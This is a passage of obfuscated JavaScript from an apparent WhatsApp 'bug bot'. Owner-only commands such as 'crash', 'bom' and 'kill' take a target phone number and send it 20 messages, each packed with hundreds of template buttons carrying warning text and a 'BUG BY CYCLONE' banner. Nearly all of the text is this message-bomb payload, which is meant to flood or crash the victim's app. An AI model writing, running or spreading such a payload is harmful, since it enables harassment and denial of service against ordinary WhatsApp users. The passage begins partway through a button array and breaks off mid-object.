{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
   { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quoted: lep }
]})
}}
txts = `SUCCES KAK`
        diablobotwhatsapp.reply(txts)
break
case 'bugsanzz1':
case 'bugsanzz2':
case 'bugsanzz3':
case 'bugsanzz4':
case 'bugsanzz5':
case 'bugsanzz6':
case 'bugsanzz7':
case 'bugsanzz8':
case 'bugsanzz9':

case 'darkness':
case 'katalog':
case 'mental':
case 'jagoan':
case 'gassan':
case 'santet':
case 'brutal':
case 'crash':
case 'trava':
case 'bom':
case 'turu':
case 'troli':
case 'dor':
case 'kill':
case 'alokhamil':
case 'kursihijau':
case 'bantengmerah':

 if (!itsMediablo) return diablobotwhatsapp.reply(`Own only`)
 const _0x9b73d7=_0x268f;function _0x16ca(){const _0x174fe6=['âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','1301419blsWFD','6932mTzwKV','BUG\x20BY\x20CYCLONE','8410380bCGJGY','157322kyamfD','211CGbyZQ','2418PETmGu','290NjpjKy','128910NzpElc','sendMessage','62368OiCTSf','https://www.whatsapp.com/otp/copy/','6NwCzzo','SUCCES\x20â','reply','170JTeEvp','99XnyyEA'];_0x16ca=function(){return _0x174fe6;};return _0x16ca();}function _0x268f(_0x1886bf,_0x4cbe97){const _0x16ca4e=_0x16ca();return _0x268f=function(_0x268f42,_0xaf1515){_0x268f42=_0x268f42-0xff;let _0x4604b8=_0x16ca4e[_0x268f42];return _0x4604b8;},_0x268f(_0x1886bf,_0x4cbe97);}(function(_0x129aa0,_0x4ae1d3){const _0x517830=_0x268f,_0x2b387=_0x129aa0();while(!![]){try{const _0x32af14=parseInt(_0x517830(0x10e))/0x1*(parseInt(_0x517830(0x10f))/0x2)+parseInt(_0x517830(0xff))/0x3+-parseInt(_0x517830(0x10a))/0x4*(parseInt(_0x517830(0x106))/0x5)+-parseInt(_0x517830(0x103))/0x6*(-parseInt(_0x517830(0x109))/0x7)+parseInt(_0x517830(0x101))/0x8*(parseInt(_0x517830(0x107))/0x9)+-parseInt(_0x517830(0x110))/0xa*(-parseInt(_0x517830(0x10d))/0xb)+-parseInt(_0x517830(0x10c))/0xc;if(_0x32af14===_0x4ae1d3)break;else _0x2b387['push'](_0x2b387['shift']());}catch(_0x370954){_0x2b387['push'](_0x2b387['shift']());}}}(_0x16ca,0x36dc9));{if(!isGroup)return diablobotwhatsapp[_0x9b73d7(0x105)]('sorry\x20anda\x20sepertinya\x20bukan\x20pemilik\x20bot');txts=_0x9b73d7(0x104),diablobotwhatsapp['reply'](txts);if(!q)return;num=''+q+'@s.whatsapp.net',jumlah='20',waktu='5s';for(let i=0x0;i<jumlah;i++){diablo[_0x9b73d7(0x100)](num,{'text':_0x9b73d7(0x10b),'templateButtons':[{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id'